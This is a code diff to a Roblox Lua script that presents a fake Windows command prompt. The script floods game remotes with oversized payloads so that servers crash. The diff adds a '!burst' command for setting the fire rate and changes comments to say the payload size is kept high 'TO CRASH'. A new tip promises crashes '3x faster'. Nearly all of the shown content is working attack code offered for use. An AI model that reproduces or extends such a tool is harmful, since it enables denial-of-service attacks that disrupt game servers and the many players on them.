@@ -8,10 +8,10 @@ local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 -- ═══════════ CORE LOGIC ═══════════
-local Children       = 180000   -- 🚨 RESTORED TO 180K
-local FireBurst      = 1.5
+local Children       = 180000   -- 🚨 KEEP AT 180K TO CRASH
+local FireBurst      = 1.5      -- 🚨 CHANGE THIS WITH !burst
 local FrameDelay     = 0.130
-local Format         = "pair"   -- 🚨 RESTORED TO PAIR
+local Format         = "pair"
 
 local state = { running = false, thread = nil, remote = nil, cache = nil, interval = 2.5, passes = 0 }
 local RemoteCandidates = {
@@ -260,6 +260,7 @@ local function processCommand(input)
         log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
         log("  !limit          - Find max safe size (Tests up to 1M)", Color3.fromRGB(200, 200, 200))
         log("  !size <number>  - Set payload size (e.g. !size 180000)", Color3.fromRGB(200, 200, 200))
+        log("  !burst <number> - Set fire burst (e.g. !burst 2)", Color3.fromRGB(200, 200, 200))
         log("  !ping           - Check server ping & advice", Color3.fromRGB(200, 200, 200))
         log("  !cls            - Clear screen", Color3.fromRGB(200, 200, 200))
         log("  !exit           - Close prompt", Color3.fromRGB(200, 200, 200))
@@ -415,7 +416,16 @@ local function processCommand(input)
             state.cache = nil
             log("[+] Payload size set to " .. tostring(Children), Color3.fromRGB(0, 255, 0))
         else
-            log("[!] Invalid number. Example: !size 150000", Color3.fromRGB(255, 50, 50))
+            log("[!] Invalid number. Example: !size 180000", Color3.fromRGB(255, 50, 50))
+        end
+        
+    elseif args[1] == "!burst" then
+        local num = tonumber(args[2])
+        if num and num > 0 then
+            FireBurst = num
+            log("[+] Fire Burst set to " .. tostring(FireBurst), Color3.fromRGB(0, 255, 0))
+        else
+            log("[!] Invalid number. Example: !burst 2", Color3.fromRGB(255, 50, 50))
         end
         
     elseif cmd == "" then
@@ -459,7 +469,7 @@ log("Microsoft Windows [Version 10.0.19045.3803]", Color3.fromRGB(200, 200, 200)
 log("(c) Microsoft Corporation. All rights reserved.", Color3.fromRGB(200, 200, 200))
 log("", Color3.fromRGB(200, 200, 200))
 log("Type '!help' for a list of available commands.", Color3.fromRGB(0, 255, 0))
-log("Pro tip: Use '!limit' to test all the way up to 1,000,000.", Color3.fromRGB(0, 200, 255))
+log("Pro tip: Use '!burst 3' to make it crash 3x faster.", Color3.fromRGB(0, 200, 255))
 log("", Color3.fromRGB(200, 200, 200))
 
 inputBox:CaptureFocus()
